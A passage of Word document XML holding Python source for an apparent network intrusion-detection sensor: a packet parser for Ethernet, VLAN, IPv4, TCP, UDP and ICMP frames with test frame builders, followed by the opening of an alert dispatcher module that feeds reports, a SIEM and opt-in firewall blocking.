    <w:p w14:paraId="43FCCC7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only produce the right answer on little-endian hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543C7E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2FC4E7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dst_mac, src_mac, eth_type = struct.unpack("!6s6sH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFC4E1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raw[:ETH_HEADER_LEN])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4C231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struct.error:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEC05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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358F49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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550BDE80" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4363B95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offset = ETH_HEADER_LEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CA9E44" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F2678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802.1Q VLAN tag sits between the MACs and the real EtherType.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DAA9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Untagged handling would drop every frame on a trunked interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C96500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while eth_type == ETH_P_VLAN and len(raw) &gt;= offset + VLAN_TAG_LEN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D898AA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eth_type = struct.unpack("!H", raw[offset + 2:offset + 4])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40997F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offset += VLAN_TAG_LEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB6EF71" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="140C9CC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eth_type != ETH_P_IPV4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E7C9F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self.dropped_non_ipv4 += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513B3D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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B6297C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F6268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IPv4 header (RFC 791) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D46D9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len(raw) &lt; offset + 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5224835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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD06E4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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2022D44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7335D2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iph = struct.unpack("!BBHHHBBH4s4s", raw[offset:offset + 20])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DD23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struct.error:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28ACAE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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B439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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341EC7A3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BDD74D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version = iph[0] &gt;&gt; 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D7E73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ihl = (iph[0] &amp; 0x0F) * 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACD3E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version != 4 or ihl &lt; 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE3D6C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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B4143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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68788687" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72CDCF3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total_length = iph[2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9474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ttl = iph[5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4643AA5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protocol = iph[6]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEB2B5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 = socket.inet_ntoa(iph[8])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EA90F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dst = socket.inet_ntoa(iph[9])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C8C7FF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42AD61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 = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10759F2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 src,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B67E15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"dst": dst,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3D246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"src_mac": src_mac.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AA035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"dst_mac": dst_mac.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4F19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"protocol_num": protocol,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519F22E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"proto": PROTO_NAMES.get(protocol, "OTHER"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610AAA9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"ttl": ttl,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713E74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"ip_total_length": total_length,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0413236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"length": len(raw),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D410A7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"sport": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733C5DD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"dport": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE8C17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"flags": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1552F3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"payload": b"",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A595C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"info": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412B57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6BB1CE7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4350AA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t_off = offset + ihl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A6EFA4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07442A7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protocol == PROTO_TCP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1DE0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len(raw) &lt; t_off + 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E37EDE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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AF4A4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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C173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tcph = struct.unpack("!HHLLBBHHH", raw[t_off:t_off + 20])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8998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data_off = (tcph[4] &gt;&gt; 4) * 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AB55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data_off &lt; 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F990B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data_off = 20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E318C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pkt["sport"], pkt["dport"] = tcph[0], tcph[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF949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pkt["seq"], pkt["ack"] = tcph[2], tcph[3]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9028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pkt["window"] = tcph[6]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5874E5A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pkt["flags"] = decode_tcp_flags(tcph[5])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179A7D0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pkt["payload"] = raw[t_off + data_off:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBA3A3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pkt["info"] = "%d -&gt; %d [%s] len=%d" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5872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pkt["sport"], pkt["dport"], pkt["flags"], len(pkt["payload"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F333141" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19F57A7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elif protocol == PROTO_UDP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7968A1D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len(raw) &lt; t_off + 8:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E168BA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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F957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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5599A4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udph = struct.unpack("!HHHH", raw[t_off:t_off + 8])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0238D2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pkt["sport"], pkt["dport"] = udph[0], udph[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E71EE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pkt["payload"] = raw[t_off + 8:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="359906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pkt["info"] = "%d -&gt; %d len=%d" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA57A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pkt["sport"], pkt["dport"], len(pkt["payload"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4951A16E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BAAE1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elif protocol == PROTO_ICMP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45965AE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len(raw) &lt; t_off + 4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342B11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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734B992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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363EF00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icmp_type, icmp_code = raw[t_off], raw[t_off + 1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278A9FB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pkt["icmp_type"], pkt["icmp_code"] = icmp_type, icmp_code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1D4C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pkt["payload"] = raw[t_off + 4:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFE47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pkt["info"] = "type=%d code=%d (%s)" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F6FA5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icmp_type, icmp_code, ICMP_TYPES.get(icmp_type, "other"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EE6A38" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D6DA9E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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331CE32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pkt["info"] = "ip protocol %d" % protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76434B3F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EAAA84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self.parsed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440741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pkt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656AA52C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="474F78D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stats(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDC244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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E69876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"parsed": self.parsed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617C1D5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"non_ipv4": self.dropped_non_ipv4,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717E38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"malformed": self.dropped_malformed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124DFC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4DFA031" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22115D41" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F335E3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 frame builders, used by unit tests and the replay self-check ----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B1D7B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build_ipv4(payload, proto, src="192.168.1.10", dst="192.168.1.20", ttl=64):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AC83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"""Assemble a valid Ethernet + IPv4 frame around a Layer-4 payload."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523357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eth = struct.pack("!6s6sH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BB7C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b"\xff\xff\xff\xff\xff\xff",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319DB03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b"\x00\x11\x22\x33\x44\x55",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097DA73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ETH_P_IPV4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34859B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total_len = 20 + len(payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B18DB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iph = struct.pack("!BBHHHBBH4s4s",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A959D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0x45, 0, total_len, 0, 0, ttl, proto, 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C1C4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socket.inet_aton(src), socket.inet_aton(dst))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9C880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eth + iph + payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1AE4A9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EC2EDC1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3727CE1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build_tcp(sport=44000, dport=80, flags=0x02, data=b"", **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1A456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tcp = struct.pack("!HHLLBBHHH", sport, dport, 0, 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E5AD0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5 &lt;&lt; 4, flags, 8192, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2CB8B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build_ipv4(tcp + data, PROTO_TCP, **kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B835E1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10F7BEF3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B652B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build_udp(sport=5353, dport=53, data=b"", **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433BC7B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udp = struct.pack("!HHHH", sport, dport, 8 + len(data), 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6769E35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build_ipv4(udp + data, PROTO_UDP, **kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64445AD9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D5E1E89" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EC630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build_icmp(icmp_type=8, code=0, data=b"ping", **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643525B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icmp = struct.pack("!BBH", icmp_type, code, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F3E47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build_ipv4(icmp + data, PROTO_ICMP, **kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5890C262" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="447E0DEE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32E9459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if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A20964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 = PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F32713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frames = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2D5C9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build_tcp(data=b"GET / HTTP/1.1"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7046B7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build_udp(data=b"\x00\x01dns"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FB43E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build_icmp(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3968E5F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b"\x00" * 10,                       # too short</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084BD21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build_ipv4(b"", 47),                # GRE - valid IPv4, unusual proto</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC657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70FF43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f in frames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A19F5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result = p.parse(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EADB9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result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF7891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print("%-5s %s -&gt; %s  %s" % (result["proto"], result["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5267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result["dst"], result["info"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575BA1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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71575E8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print("dropped (%d bytes)" % len(f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD2C0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print(p.stats())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132C1B65"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src/sensor_node/dispatcher.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E239B5B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>182 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570BA5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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74CECA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"""Alert fan-out and response policy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4D02E1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71743E8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The sensor composes an `AlertDispatcher` alongside the `PacketParser`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139014F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Centralising alert handling prevents different interfaces from recording the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19802F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same event in different ways.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659BD235" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25DC2C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Centralising it here means every alert, from every engine, is:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9D234E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49600E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 enriched once with ATT&amp;CK context and a risk score;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052583E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2. recorded in the forensic HTML report;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B42FBA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3. written to the CSV audit trail (privacy policy applied);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BE213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4. forwarded to the SIEM as structured JSON;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500D477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5. pushed to whichever UI is attached;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287BB68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6. considered for an active-defence firewall drop.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D168DD9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="554C7C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Any engine may request a block, but blocking remains opt-in and the whitelist</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725B81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is always enforced.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B87202C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49EA19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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DA106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2CB3AF9C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0464C10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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284CE1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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28818BF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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE4454D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C434D0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sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEEC5E8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F2B303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utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E6A7FF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29C7A393" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ADB123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AlertDispatcher:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7157DE8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"""Single exit point for every alert the engines raise."""</w:t>
      </w:r>
    </w:p>
